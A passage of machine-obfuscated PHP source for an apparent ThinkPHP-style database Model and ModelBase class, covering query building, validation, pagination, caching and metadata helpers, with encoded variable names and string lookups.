= $…´”Øóµ[$°ğ•ëÑÄ[0]]; } if (!empty($…´”Øóµ[$this->getPk()])) { $ùøğ‚Ÿú[$this->getPk()] = array($¤õ—€™[417], $…´”Øóµ[$this->getPk()]); } if ($this->where($ùøğ‚Ÿú)->find()) { return !1; } return !0; default: return $this->check($…´”Øóµ[$°ğ•ëÑÄ[0]], $°ğ•ëÑÄ[1], $°ğ•ëÑÄ[4]); } } public function check($«¯äö¤¡, $Œ•Š¯, $óÑİé†Ù = "\162\145\147\x65\170") { $âÄÂ÷ñŸ =& $_SERVER[´È¥ö†ö]; $óÑİé†Ù = strtolower(trim($óÑİé†Ù)); switch ($óÑİé†Ù) { case $âÄÂ÷ñŸ[7]: case $âÄÂ÷ñŸ[418]: $¸£Ô¾¶è = is_array($Œ•Š¯) ? $Œ•Š¯ : explode($âÄÂ÷ñŸ[50], $Œ•Š¯); return $óÑİé†Ù == $âÄÂ÷ñŸ[7] ? in_array($«¯äö¤¡, $¸£Ô¾¶è) : !in_array($«¯äö¤¡, $¸£Ô¾¶è); case $âÄÂ÷ñŸ[419]: case $âÄÂ÷ñŸ[420]: if (is_array($Œ•Š¯)) { $–©áË» = $Œ•Š¯[0]; $ÉÆÙ±³ = $Œ•Š¯[1]; } else { list($–©áË», $ÉÆÙ±³) = explode($âÄÂ÷ñŸ[50], $Œ•Š¯); } return $óÑİé†Ù == $âÄÂ÷ñŸ[419] ? $«¯äö¤¡ >= $–©áË» && $«¯äö¤¡ <= $ÉÆÙ±³ : $«¯äö¤¡ < $–©áË» || $«¯äö¤¡ > $ÉÆÙ±³; case $âÄÂ÷ñŸ[421]: case $âÄÂ÷ñŸ[422]: return $óÑİé†Ù == $âÄÂ÷ñŸ[421] ? $«¯äö¤¡ == $Œ•Š¯ : $«¯äö¤¡ != $Œ•Š¯; case $âÄÂ÷ñŸ[423]: $ßşñÈÀ‰ = mb_strlen($«¯äö¤¡, $âÄÂ÷ñŸ[424]); if (strpos($Œ•Š¯, $âÄÂ÷ñŸ[50])) { list($–©áË», $ÉÆÙ±³) = explode($âÄÂ÷ñŸ[50], $Œ•Š¯); return $ßşñÈÀ‰ >= $–©áË» && $ßşñÈÀ‰ <= $ÉÆÙ±³; } else { return $ßşñÈÀ‰ == $Œ•Š¯; } case $âÄÂ÷ñŸ[425]: list($ï„ÈÅ , $‹âï) = explode($âÄÂ÷ñŸ[50], $Œ•Š¯); if (!is_numeric($ï„ÈÅ )) { $ï„ÈÅ  = strtotime($ï„ÈÅ ); } if (!is_numeric($‹âï)) { $‹âï = strtotime($‹âï); } return NOW_TIME >= $ï„ÈÅ  && NOW_TIME <= $‹âï; case $âÄÂ÷ñŸ[426]: return in_array(get_client_ip(), explode($âÄÂ÷ñŸ[50], $Œ•Š¯)); case $âÄÂ÷ñŸ[427]: return !in_array(get_client_ip(), explode($âÄÂ÷ñŸ[50], $Œ•Š¯)); case $âÄÂ÷ñŸ[414]: default: return $this->regex($«¯äö¤¡, $Œ•Š¯); } } public function query($ıı”ñÄù, $÷×”ÓŸª = false) { $ˆèìİÙš =& $_SERVER[´È¥ö†ö]; if (!is_bool($÷×”ÓŸª) && !is_array($÷×”ÓŸª)) { $÷×”ÓŸª = func_get_args(); array_shift($÷×”ÓŸª); } $ıı”ñÄù = str_replace(array($ˆèìİÙš[287], $ˆèìİÙš[428]), $ˆèìİÙš[53], $ıı”ñÄù); $ıı”ñÄù = $this->parseSql($ıı”ñÄù, $÷×”ÓŸª); return $this->db->query($ıı”ñÄù); } public function execute($Û°ÁÚÁ‰, $Ã…İ×’Ù = false) { if (!is_bool($Ã…İ×’Ù) && !is_array($Ã…İ×’Ù)) { $Ã…İ×’Ù = func_get_args(); array_shift($Ã…İ×’Ù); } $Û°ÁÚÁ‰ = $this->parseSql($Û°ÁÚÁ‰, $Ã…İ×’Ù); return $this->db->execute($Û°ÁÚÁ‰); } protected function parseSql($ÕŒÆÜ±«, $ì³¾°¡) { $ıŞ÷Ä˜ƒ =& $_SERVER[´È¥ö†ö]; if (!0 === $ì³¾°¡) { $Ëüû“¹› = $this->_parseOptions(); $ÕŒÆÜ±« = $this->db->parseSql($ÕŒÆÜ±«, $Ëüû“¹›); } elseif (is_array($ì³¾°¡)) { $ì³¾°¡ = array_map(array($this->db, $ıŞ÷Ä˜ƒ[429]), $ì³¾°¡); $ÕŒÆÜ±« = vsprintf($ÕŒÆÜ±«, $ì³¾°¡); } else { $ÕŒÆÜ±« = strtr($ÕŒÆÜ±«, array($ıŞ÷Ä˜ƒ[430] => $this->getTableName(), $ıŞ÷Ä˜ƒ[431] => think_config($ıŞ÷Ä˜ƒ[332]))); } $this->db->setModel($this->name); return $ÕŒÆÜ±«; } public function db($èÙ¾ò”¦ = '', $µ¼ñúÂÓ = '', $‡Æª¹óÖ = array()) { $º›÷§ƒ =& $_SERVER[´È¥ö†ö]; if ($º›÷§ƒ[12] === $èÙ¾ò”¦ && $this->db) { return $this->db; } static $áÙ¦Ş«ô = array(); static $‰ƒ‘¥Œ = array(); if (!isset($‰ƒ‘¥Œ[$èÙ¾ò”¦]) || isset($‰ƒ‘¥Œ[$èÙ¾ò”¦]) && $µ¼ñúÂÓ && $áÙ¦Ş«ô[$èÙ¾ò”¦] != $µ¼ñúÂÓ) { if (!empty($µ¼ñúÂÓ) && is_string($µ¼ñúÂÓ) && !1 === strpos($µ¼ñúÂÓ, $º›÷§ƒ[8])) { $µ¼ñúÂÓ = think_config($µ¼ñúÂÓ); } $èÙ¾ò”¦ = think_guid($µ¼ñúÂÓ); $‰ƒ‘¥Œ[$èÙ¾ò”¦] = Db::getInstance($µ¼ñúÂÓ); } elseif (NULL === $µ¼ñúÂÓ) { $‰ƒ‘¥Œ[$èÙ¾ò”¦]->close(); unset($‰ƒ‘¥Œ[$èÙ¾ò”¦]); return; } if (!empty($‡Æª¹óÖ)) { if (is_string($‡Æª¹óÖ)) { parse_str($‡Æª¹óÖ, $‡Æª¹óÖ); } foreach ($‡Æª¹óÖ as $ÑÇ™ì¦ => $õøÁûŸ) { $this->setProperty($ÑÇ™ì¦, $õøÁûŸ); } } $áÙ¦Ş«ô[$èÙ¾ò”¦] = $µ¼ñúÂÓ; $this->db = $‰ƒ‘¥Œ[$èÙ¾ò”¦]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $’Åæ‹¼ = get_class($this); if ($’Åæ‹¼ == $_SERVER[´È¥ö†ö][432]) { return $this->name; } $this->name = substr($’Åæ‹¼, 0, -5); } return $this->name; } public function getTableName() { $×±©˜Ñ¸ =& $_SERVER[´È¥ö†ö]; if (empty($this->trueTableName)) { $ÆÏß‘ø = !empty($this->tablePrefix) ? $this->tablePrefix : $×±©˜Ñ¸[12]; if (!empty($this->tableName)) { $ÆÏß‘ø .= $this->tableName; } else { $ÆÏß‘ø .= think_parse_name($this->name); } $this->trueTableName = strtolower($ÆÏß‘ø); } return (!empty($this->dbName) ? $this->dbName . $×±©˜Ñ¸[10] : $×±©˜Ñ¸[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $¯Õ¦Áèæ =& $_SERVER[´È¥ö†ö]; return isset($this->fields[$¯Õ¦Áèæ[339]]) ? $this->fields[$¯Õ¦Áèæ[339]] : $this->pk; } public function getDbFields() { $İãéŒ­Ú =& $_SERVER[´È¥ö†ö]; if (isset($this->options[$İãéŒ­Ú[367]])) { $æ¿‰¢“Ì = $this->db->getFields($this->options[$İãéŒ­Ú[367]]); return $æ¿‰¢“Ì ? array_keys($æ¿‰¢“Ì) : !1; } if ($this->fields) { $æ¿‰¢“Ì = $this->fields; unset($æ¿‰¢“Ì[$İãéŒ­Ú[338]], $æ¿‰¢“Ì[$İãéŒ­Ú[339]], $æ¿‰¢“Ì[$İãéŒ­Ú[340]], $æ¿‰¢“Ì[$İãéŒ­Ú[337]]); return $æ¿‰¢“Ì; } return !1; } public function data($üš øï¿ = '') { $£ğçáê± =& $_SERVER[´È¥ö†ö]; if ($£ğçáê±[12] === $üš øï¿ && !empty($this->data)) { return $this->data; } if (is_object($üš øï¿)) { $üš øï¿ = get_object_vars($üš øï¿); } elseif (is_string($üš øï¿)) { parse_str($üš øï¿, $üš øï¿); } elseif (!is_array($üš øï¿)) { think_exception(think_lang($£ğçáê±[359])); } $this->data = $üš øï¿; return $this; } public function join($­”§£÷˜) { $¿£ü Ì§ =& $_SERVER[´È¥ö†ö]; if (is_array($­”§£÷˜)) { $this->options[$¿£ü Ì§[370]] = $­”§£÷˜; } elseif (!empty($­”§£÷˜)) { $this->options[$¿£ü Ì§[370]][] = $­”§£÷˜; } return $this; } public function union($Ìì½Õêš, $ˆõÛÜ—µ = false) { $°‚ô›À’ =& $_SERVER[´È¥ö†ö]; if (empty($Ìì½Õêš)) { return $this; } if ($ˆõÛÜ—µ) { $this->options[$°‚ô›À’[433]][$°‚ô›À’[434]] = !0; } if (is_object($Ìì½Õêš)) { $Ìì½Õêš = get_object_vars($Ìì½Õêš); } if (is_string($Ìì½Õêš)) { $§®‚ıÊÅ = $Ìì½Õêš; } elseif (is_array($Ìì½Õêš)) { if (isset($Ìì½Õêš[0])) { $this->options[$°‚ô›À’[433]] = array_merge($this->options[$°‚ô›À’[433]], $Ìì½Õêš); return $this; } else { $§®‚ıÊÅ = $Ìì½Õêš; } } else { think_exception(think_lang($°‚ô›À’[359])); } $this->options[$°‚ô›À’[433]][] = $§®‚ıÊÅ; return $this; } public function cache($ıœªœ» = true, $ñ‘ò£“ = null, $Ê†¡©Ì = '') { $¼»‚ÃÜ =& $_SERVER[´È¥ö†ö]; if (!1 !== $ıœªœ») { $this->options[$¼»‚ÃÜ[435]] = array($¼»‚ÃÜ[97] => $ıœªœ», $¼»‚ÃÜ[425] => $ñ‘ò£“, $¼»‚ÃÜ[33] => $Ê†¡©Ì); } return $this; } public function field($øİçØÜ˜, $º²šî… = false) { $à¹¿Î¯Ğ =& $_SERVER[´È¥ö†ö]; if (!0 === $øİçØÜ˜) { $öÙáÂâÖ = $this->getDbFields(); $øİçØÜ˜ = $öÙáÂâÖ ? $öÙáÂâÖ : $à¹¿Î¯Ğ[222]; } elseif ($º²šî…) { if (is_string($øİçØÜ˜)) { $øİçØÜ˜ = explode($à¹¿Î¯Ğ[50], $øİçØÜ˜); } $öÙáÂâÖ = $this->getDbFields(); $øİçØÜ˜ = $öÙáÂâÖ ? array_diff($öÙáÂâÖ, $øİçØÜ˜) : $øİçØÜ˜; } $this->options[$à¹¿Î¯Ğ[361]] = $øİçØÜ˜; return $this; } public function scope($Ëîå…œ = '', $ğëÁªû¢ = NULL) { $×‡Øš¦é =& $_SERVER[´È¥ö†ö]; if ($×‡Øš¦é[12] === $Ëîå…œ) { if (isset($this->_scope[$×‡Øš¦é[37]])) { $šÓ¦õ‡è = $this->_scope[$×‡Øš¦é[37]]; } else { return $this; } } elseif (is_string($Ëîå…œ)) { $û¾»Îäã = explode($×‡Øš¦é[50], $Ëîå…œ); $šÓ¦õ‡è = array(); foreach ($û¾»Îäã as $öôÆ¨ˆ…) { if (!isset($this->_scope[$öôÆ¨ˆ…])) { continue; } $šÓ¦õ‡è = array_merge($šÓ¦õ‡è, $this->_scope[$öôÆ¨ˆ…]); } if (!empty($ğëÁªû¢) && is_array($ğëÁªû¢)) { $šÓ¦õ‡è = array_merge($šÓ¦õ‡è, $ğëÁªû¢); } } elseif (is_array($Ëîå…œ)) { $šÓ¦õ‡è = $Ëîå…œ; } if (is_array($šÓ¦õ‡è) && !empty($šÓ¦õ‡è)) { $this->options = array_merge($this->options, array_change_key_case($šÓ¦õ‡è)); } return $this; } public function where($¼ÃúîÀœ, $…ÔûÎŠ¥ = null) { $½’²ıóÑ =& $_SERVER[´È¥ö†ö]; if (!is_null($…ÔûÎŠ¥) && is_string($¼ÃúîÀœ)) { if (!is_array($…ÔûÎŠ¥)) { $…ÔûÎŠ¥ = func_get_args(); array_shift($…ÔûÎŠ¥); } $…ÔûÎŠ¥ = array_map(array($this->db, $½’²ıóÑ[429]), $…ÔûÎŠ¥); $¼ÃúîÀœ = vsprintf($¼ÃúîÀœ, $…ÔûÎŠ¥); } elseif (is_object($¼ÃúîÀœ)) { $¼ÃúîÀœ = get_object_vars($¼ÃúîÀœ); } elseif (is_array($¼ÃúîÀœ)) { foreach ($¼ÃúîÀœ as $§éæ¹½é => $´ŸÓÌŞ) { if ((is_numeric($§éæ¹½é) || !$§éæ¹½é) && is_string($´ŸÓÌŞ)) { if (strpos($´ŸÓÌŞ, $½’²ıóÑ[436]) === 0) { continue; } think_trace($½’²ıóÑ[437], $½’²ıóÑ[12], $½’²ıóÑ[49]); die; } } } if (is_string($¼ÃúîÀœ) && $½’²ıóÑ[12] != $¼ÃúîÀœ) { $Ã½¸æ¡° = array(); $Ã½¸æ¡°[$½’²ıóÑ[438]] = $¼ÃúîÀœ; $¼ÃúîÀœ = $Ã½¸æ¡°; } if (isset($this->options[$½’²ıóÑ[363]])) { $this->options[$½’²ıóÑ[363]] = array_merge($this->options[$½’²ıóÑ[363]], $¼ÃúîÀœ); } else { $this->options[$½’²ıóÑ[363]] = $¼ÃúîÀœ; } return $this; } public function limit($ùÊàÖ»é, $ï­öı¹ = null) { $Ÿ‹ÌûË =& $_SERVER[´È¥ö†ö]; $this->options[$Ÿ‹ÌûË[378]] = is_null($ï­öı¹) ? $ùÊàÖ»é : $ùÊàÖ»é . $Ÿ‹ÌûË[50] . $ï­öı¹; return $this; } public function page($™ıûÕ¦ò, $ŸıÔĞ¸õ = null) { $»‚¼ÂöÜ =& $_SERVER[´È¥ö†ö]; $this->options[$»‚¼ÂöÜ[439]] = is_null($ŸıÔĞ¸õ) ? $™ıûÕ¦ò : $™ıûÕ¦ò . $»‚¼ÂöÜ[50] . $ŸıÔĞ¸õ; return $this; } public function comment($‹œ¾¹å) { $this->options[$_SERVER[´È¥ö†ö][440]] = $‹œ¾¹å; return $this; } public function setProperty($Šçç€ÜŞ, $¾Ãê²¡ê) { if (property_exists($this, $Šçç€ÜŞ)) { $this->{$Šçç€ÜŞ} = $¾Ãê²¡ê; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\x64\x69\146\x79\124\151\155\x65", "\x74\151\x6d\x65", "\x69\156\x73\x65\162\164\54\x75\x70\x64\141\164\x65", "\x66\x75\156\x63\x74\151\x6f\156"), array("\143\x72\x65\x61\x74\x65\x54\151\x6d\145", "\x74\x69\x6d\145", "\x69\156\163\x65\162\x74", "\146\x75\x6e\143\x74\x69\x6f\156")); public function setDataAuto($à¦æïïô) { $this->dataAuto = $à¦æïïô; } public function __construct($ùÄ°ÖîÆ = '', $Äüòêƒ“ = '', $íÛ®Ô®¯ = '') { parent::__construct($ùÄ°ÖîÆ, $Äüòêƒ“, $íÛ®Ô®¯); } protected $tableMeta = array(); protected function _beforeInsert(&$É€‘ÇŞ, $­àŸõ…ñ) { $‡ÜâİŞ³ =& $_SERVER[´È¥ö†ö]; if (!$this->checkDataAutoHas($‡ÜâİŞ³[441])) { return; } $this->dataBeforeFilter($É€‘ÇŞ, $‡ÜâİŞ³[441]); } protected function _beforeUpdate(&$’‡şíÁ, $ğºè¸‡€) { $´ù•ÀÔó =& $_SERVER[´È¥ö†ö]; if (!$this->checkDataAutoHas($´ù•ÀÔó[442])) { return; } $this->dataBeforeFilter($’‡şíÁ, $´ù•ÀÔó[442]); } protected function _afterSelect(&$Í§Œ«ú·, $µÆ¹üñ) { if (!is_array($Í§Œ«ú·)) { return; } if (!$this->checkDataAutoHas($_SERVER[´È¥ö†ö][443])) { return; } foreach ($Í§Œ«ú· as &$ì¼ˆóÅô) { $this->dataAfterFilter($ì¼ˆóÅô); } unset($ì¼ˆóÅô); } protected function _afterFind(&$ôñ£®¡, $¨ûå‘¤İ) { if (!is_array($ôñ£®¡)) { return; } if (!$this->checkDataAutoHas($_SERVER[´È¥ö†ö][443])) { return; } $this->dataAfterFilter($ôñ£®¡); } public static function textEncode($ü¯ûâÔ½) { if (!$ü¯ûâÔ½) { return $ü¯ûâÔ½; } $·®õ¶µ = json_encode($ü¯ûâÔ½); $·®õ¶µ = preg_replace_callback($_SERVER[´È¥ö†ö][444], function ($İ—Šâ˜Ø) { return addslashes($İ—Šâ˜Ø[0]); }, $·®õ¶µ); return json_decode($·®õ¶µ); } public static function textDecode($”ûÔ£‚) { $Öµé¡üÄ =& $_SERVER[´È¥ö†ö]; $ÓÒÀûò = json_encode($”ûÔ£‚); $ÓÒÀûò = preg_replace_callback($Öµé¡üÄ[445], function ($´îŒáİì) { return $_SERVER[´È¥ö†ö][100]; }, $ÓÒÀûò); return json_decode($ÓÒÀûò); } public function setAutoIncrement($™òìú¢¡) { $Ô²À¼¢Ş = array($this->getPk() => $™òìú¢¡); $–¾œÔ = $this->data($Ô²À¼¢Ş)->add(); if ($–¾œÔ) { $this->delete($–¾œÔ); } } public function getAutoIncrement() { $¤Ô©¹Œ¦ = $this->getTableName(); $¯¿Â€» = $this->max($this->getPk()); $‰ÙúÅ¯„ = $this->query("\x73\150\157\x77\x20\164\141\x62\x6c\x65\40\x73\164\x61\164\x75\x73\40\x77\150\x65\162\145\40\116\x61\x6d\145\x3d\47{$¤Ô©¹Œ¦}\x27"); $İ®öò¯‹ = $‰ÙúÅ¯„[0][$_SERVER[´È¥ö†ö][446]]; $Å»Ù¿ = max($¯¿Â€», $İ®öò¯‹); return $Å»Ù¿; } protected function _callBefore($ôşˆÒû–, $ÅøœÖ “) { return $this->cacheCallCheck($ôşˆÒû–, $ÅøœÖ “, !1); } protected function _callAfter($½ü®œõ€, $øİæû‡) { return $this->cacheCallCheck($½ü®œõ€, $øİæû‡, !0); } protected function cacheFunctionAlias($—§ÑšÔÇ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ŸÇ“—öÔ, $‡—Åä‡¨, $Ú÷à´ÌÂ = false) { $•Ã×ŠÆƒ =& $_SERVER[´È¥ö†ö]; $Ì·ĞÍ… = $this->cacheFunctionAlias($‡—Åä‡¨); if (!$Ì·ĞÍ…) { return; } foreach ($Ì·ĞÍ… as $Òû­Éä„ => $â„Ëü§ø) { $“¤‰ø” = $â„Ëü§ø[0]; $ÛÖòì­ = explode($•Ã×ŠÆƒ[50], $â„Ëü§ø[1]); $½¾üéÍ = isset($â„Ëü§ø[2]) ? $â„Ëü§ø[2] : $•Ã×ŠÆƒ[12]; if ($ŸÇ“—öÔ == $Òû­Éä„) { return $this->cacheFunctionGet($Òû­Éä„, $“¤‰ø”, $½¾üéÍ); } if ($Ú÷à´ÌÂ && in_array($ŸÇ“—öÔ, $ÛÖòì­)) { $this->cacheFunctionClear($Òû­Éä„, $“¤‰ø”, $½¾üéÍ); } } } public function cacheFunctionGet($Ï®¾ŞÖ‹, $áÔø¯£, $Ã¥Ï¡’µ = '') { $ßÈ•¡Ï¸ = $this->cacheKeyMake($Ï®¾ŞÖ‹, $áÔø¯£, $Ã¥Ï¡’µ); $¼»áÓÊÛ = Cache::get($ßÈ•¡Ï¸); if (!is_array($¼»áÓÊÛ)) { $¼»áÓÊÛ = call_user_func_array(array($this, $Ï®¾ŞÖ‹), array($áÔø¯£, !0)); Cache::set($ßÈ•¡Ï¸, $¼»áÓÊÛ); } return $¼»áÓÊÛ; } public function cacheFunctionClear($Ÿ¦Ìè–ı, $Ÿğ¼ææ», $‡ÈèŸÑ¯ = '') { $­ŸÎ­¦ø = $Ÿğ¼ææ»; if (!is_array($Ÿğ¼ææ»)) { $­ŸÎ­¦ø = array($Ÿğ¼ææ»); } foreach ($­ŸÎ­¦ø as $ŞøŒ ¥) { $ò¯³²‚É = $this->cacheKeyMake($Ÿ¦Ìè–ı, $ŞøŒ ¥, $‡ÈèŸÑ¯); Cache::remove($ò¯³²‚É); } } private function cacheKeyMake($‡­¯ßİ, $Ÿá¹ù¿Î, $ùŸ¦ª×÷) { $–Äô²ª =& $_SERVER[´È¥ö†ö]; if ($ùŸ¦ª×÷) { $Ÿá¹ù¿Î = $Ÿá¹ù¿Î . $–Äô²ª[447] . $ùŸ¦ª×÷; } return get_class($this) . $–Äô²ª[11] . $‡­¯ßİ . $–Äô²ª[448] . $Ÿá¹ù¿Î; } protected function selectPageReset() { $‰ú¸å¾ã =& $_SERVER[´È¥ö†ö]; if (isset($GLOBALS[$‰ú¸å¾ã[449]])) { return; } $GLOBALS[$‰ú¸å¾ã[449]] = isset($GLOBALS[$‰ú¸å¾ã[7]][$‰ú¸å¾ã[450]]) ? $GLOBALS[$‰ú¸å¾ã[7]][$‰ú¸å¾ã[450]] : !1; $GLOBALS[$‰ú¸å¾ã[451]] = isset($GLOBALS[$‰ú¸å¾ã[7]][$‰ú¸å¾ã[439]]) ? $GLOBALS[$‰ú¸å¾ã[7]][$‰ú¸å¾ã[439]] : !1; $GLOBALS[$‰ú¸å¾ã[7]][$‰ú¸å¾ã[450]] = !1; $GLOBALS[$‰ú¸å¾ã[7]][$‰ú¸å¾ã[439]] = !1; } protected function selectPageRestore() { $†ú¤öã‚ =& $_SERVER[´È¥ö†ö]; if (!isset($GLOBALS[$†ú¤öã‚[449]])) { return; } $GLOBALS[$†ú¤öã‚[7]][$†ú¤öã‚[450]] = $GLOBALS[$†ú¤öã‚[449]]; $GLOBALS[$†ú¤öã‚[7]][$†ú¤öã‚[439]] = $GLOBALS[$†ú¤öã‚[451]]; if ($GLOBALS[$†ú¤öã‚[7]][$†ú¤öã‚[450]] === !1) { unset($GLOBALS[$†ú¤öã‚[7]][$†ú¤öã‚[450]]); } if ($GLOBALS[$†ú¤öã‚[7]][$†ú¤öã‚[439]] === !1) { unset($GLOBALS[$†ú¤öã‚[7]][$†ú¤öã‚[439]]); } unset($GLOBALS[$†ú¤öã‚[449]]); unset($GLOBALS[$†ú¤öã‚[451]]); } protected function selectPage($Äá•±õÙ = 200, $ö¡³­ı = 1) { $û¨¿…Åµ =& $_SERVER[´È¥ö†ö]; global $in; $Í¡”Ñ…‘ = $this->optionsValue(); $´Äª´ˆÎ = 50000; $Äá•±õÙ = isset($in[$û¨¿…Åµ[450]]) && $in[$û¨¿…Åµ[450]] ? $in[$û¨¿…Åµ[450]] : $Äá•±õÙ; if ($Äá•±õÙ === -1) { $in[$û¨¿…Åµ[450]] = !1; $´Äª´ˆÎ = 100000000; $Äá•±õÙ = $´Äª´ˆÎ; } $Ç‹Ú© = $Í¡”Ñ…‘; $Ç‹Ú©[$û¨¿…Åµ[452]] = array(); $Äá•±õÙ = intval($Äá•±õÙ); $Äá•±õÙ = $Äá•±õÙ <= 5 ? 5 : ($Äá•±õÙ >= $´Äª´ˆÎ ? $´Äª´ˆÎ : $Äá•±õÙ); $ö¡³­ı = intval(isset($in[$û¨¿…Åµ[439]]) && $in[$û¨¿…Åµ[439]] ? $in[$û¨¿…Åµ[439]] : $ö¡³­ı); $ö¡³­ı = $ö¡³­ı <= 1 ? 1 : $ö¡³­ı; $¦Ô •İ¾ = array(); $ó««±±ˆ = 1; if ($ö¡³­ı == 1 && $ó««±±ˆ) { $this->optionsValue($Í¡”Ñ…‘); $¦Ô •İ¾ = $this->page($ö¡³­ı, $Äá•±õÙ)->select(); $ÂÃÎ‚•… = is_array($¦Ô •İ¾) ? count($¦Ô •İ¾) : 0; if ($ÂÃÎ‚•… < $Äá•±õÙ) { $„Ë Üè¦ = 1; } else { $this->optionsValue($Ç‹Ú©); $ÂÃÎ‚•… = intval($this->count()); $„Ë Üè¦ = ceil($ÂÃÎ‚•… / $Äá•±õÙ); } } else { $this->optionsValue($Ç‹Ú©); $ÂÃÎ‚•… = intval($this->count()); $„Ë Üè¦ = ceil($ÂÃÎ‚•… / $Äá•±õÙ); $ö¡³­ı = $ö¡³­ı >= $„Ë Üè¦ ? $„Ë Üè¦ : $ö¡³­ı; $this->optionsValue($Í¡”Ñ…‘); $¦Ô •İ¾ = $this->page($ö¡³­ı, $Äá•±õÙ)->select(); } if (!is_array($¦Ô •İ¾)) { $¦Ô •İ¾ = array(); } if ($„Ë Üè¦ == 1) { $ÂÃÎ‚•… = count($¦Ô •İ¾); } $ÒÑÖ¦Ë¡ = array($û¨¿…Åµ[453] => array($û¨¿…Åµ[454] => $ÂÃÎ‚•…, $û¨¿…Åµ[450] => $Äá•±õÙ, $û¨¿…Åµ[439] => $ö¡³­ı, $û¨¿…Åµ[455] => $„Ë Üè¦), $û¨¿…Åµ[456] => $¦Ô •İ¾); return $ÒÑÖ¦Ë¡; } protected function checkLength($õ³ÑÑ‚Ü, $ˆ·¼í–ˆ = 0, $ª¸İÖó¨ = '') { $í·Šå˜æ =& $_SERVER[´È¥ö†ö]; $ˆ·¼í–ˆ = $ˆ·¼í–ˆ ? $ˆ·¼í–ˆ : 65536; if (!$õ³ÑÑ‚Ü || strlen($õ³ÑÑ‚Ü) < $ˆ·¼í–ˆ) { return; } $ª¸İÖó¨ = $ª¸İÖó¨ ? $ª¸İÖó¨ . $í·Šå˜æ[74] : $í·Šå˜æ[12]; show_json($ª¸İÖó¨ . LNG($í·Šå˜æ[457]) . "\x28{$ˆ·¼í–ˆ}\51", !1); } protected function metaSet($×õ’¥ª, $É„ş€¾ó = null, $Æ™âöë¯ = null) { $‹«ëŸâ‘ =& $_SERVER[´È¥ö†ö]; if (!$this->tableMeta || !$×õ’¥ª) { return !1; } $Ëøá³Ìì = $this->tableMeta[$‹«ëŸâ‘[458]]; $ã‰½Á = $this->tableMeta[$‹«ëŸâ‘[459]]; $’¾™Êëà = Model($ã‰½Á); $¨ÉÜ½îÕ = array($Ëøá³Ìì => $×õ’¥ª, $‹«ëŸâ‘[460] => $É„ş€¾ó); if (is_null($É„ş€¾ó)) { return $’¾™Êëà->where(array($Ëøá³Ìì => $×õ’¥ª))->delete(); } if (is_null($Æ™âöë¯) && is_string($É„ş€¾ó)) { return $’¾™Êëà->where($¨ÉÜ½îÕ)->delete(); } $’Ù’•ı = is_array($É„ş€¾ó) ? $É„ş€¾ó : array(); if (is_string($É„ş€¾ó)) { $’Ù’•ı[$É„ş€¾ó] = $Æ™âöë¯; } $´ÜáÕÏ = array(); foreach ($’Ù’•ı as $ÖáÍ­¶² => $Àùâ•Ò) { if (is_null($Àùâ•Ò) && is_string($ÖáÍ­¶²)) { $’¾™Êëà->where(array($Ëøá³Ìì => $×õ’¥ª, $‹«ëŸâ‘[460] => $ÖáÍ­¶²))->delete(); continue; } $this->checkLength($Àùâ•Ò, !1, $ã‰½Á . $‹«ëŸâ‘[4] . $ÖáÍ­¶²); $´ÜáÕÏ[] = array($Ëøá³Ìì => $×õ’¥ª, $‹«ëŸâ‘[97] => $ÖáÍ­¶², $‹«ëŸâ‘[461] => $Àùâ•Ò); } $“¬‰é“º = $‹«ëŸâ‘[462] . $ã‰½Á; CacheLock::lock($“¬‰é“º); $’¾™Êëà->where(array($Ëøá³Ìì => $×õ’¥ª))->addAll($´ÜáÕÏ, array(), !0); CacheLock::unlock($“¬‰é“º); return !0; } public function metaGet($Ö¸Ìú½˜, $‚ãúØ¥™ = false) { $³­àğ‚Ú =& $_SERVER[´È¥ö†ö]; if (!$this->tableMeta) { return array(); } $¬²üûÖ· = $this->tableMeta[$³­àğ‚Ú[458]]; $‹œ¤×¼¥ = Model($this->tableMeta[$³­àğ‚Ú[459]]); if ($‚ãúØ¥™) { $‰î¢Úª = array($¬²üûÖ· => $Ö¸Ìú½˜, $³­àğ‚Ú[97] => $‚ãúØ¥™); return $‹œ¤×¼¥->where($‰î¢Úª)->getField($³­àğ‚Ú[461]); } $‰î¢Úª = array($¬²üûÖ· => $Ö¸Ìú½˜); $óÔ¼ÇÂ = $‹œ¤×¼¥->field($³­àğ‚Ú[463])->where($‰î¢Úª)->select(); $óÔ¼ÇÂ = array_to_keyvalue($óÔ¼ÇÂ, $³­àğ‚Ú[97], $³­àğ‚Ú[461]); return $óÔ¼ÇÂ; } private function checkDataAutoHas($ĞäúÏ‚„) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $ğÉÇË›) { if (in_array($ĞäúÏ‚„, explode($_SERVER[´È¥ö†ö][50], $ğÉÇË›[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$õë²ŠØÌ, $ÇÌû¼) { $•Ó¨ÓØ³ =& $_SERVER[´È¥ö†ö]; if (!is_array($õë²ŠØÌ)) { return; } foreach ($this->dataAuto as $ù–úì²Ã) { $¼ «ğ¨Í = $ù–úì²Ã[0]; if (!in_array($ÇÌû¼, explode($•Ó¨ÓØ³[50], $ù–úì²Ã[2]))) { continue; } switch (trim($ù–úì²Ã[3])) { case $•Ó¨ÓØ³[407]: case $•Ó¨ÓØ³[408]: $§…´°ü  = $ù–úì²Ã[1]; $şáÌôÄ = isset($ù–úì²Ã[4]) ? (array) $ù–úì²Ã[4] : array(); if ($§…´°ü  == $•Ó¨ÓØ³[206] && array_key_exists($¼ «ğ¨Í, $õë²ŠØÌ)) { if (!$õë²ŠØÌ[$¼ «ğ¨Í]) { unset($õë²ŠØÌ[$¼ «ğ¨Í]); } break; } if (isset($õë²ŠØÌ[$¼ «ğ¨Í])) { array_unshift($şáÌôÄ, $õë²ŠØÌ[$¼ «ğ¨Í]); } if ($•Ó¨ÓØ³[407] == $ù–úì²Ã[3]) { $õë²ŠØÌ[$¼ «ğ¨Í] = 